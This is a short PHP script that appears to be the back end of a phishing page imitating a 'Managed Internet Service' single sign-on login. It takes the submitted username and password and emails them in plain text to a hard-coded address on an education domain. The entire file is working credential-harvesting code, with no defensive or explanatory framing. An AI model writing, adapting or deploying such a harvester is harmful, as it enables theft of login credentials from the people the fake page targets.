<?php

// Retrieve form data
$username = $_POST['pf.username'];
$password = $_POST['pf.pass'];

// Email details (replace with your information)
$to = 'lward181@eq.edu.au';
$subject = 'Managed Internet Service Login';
$message = "Username: $username\nPassword: $password";

// Send email
if (mail($to, $subject, $message)) {
  echo 'Email sent successfully!';
} else {
  echo 'Error sending email.';
}

?>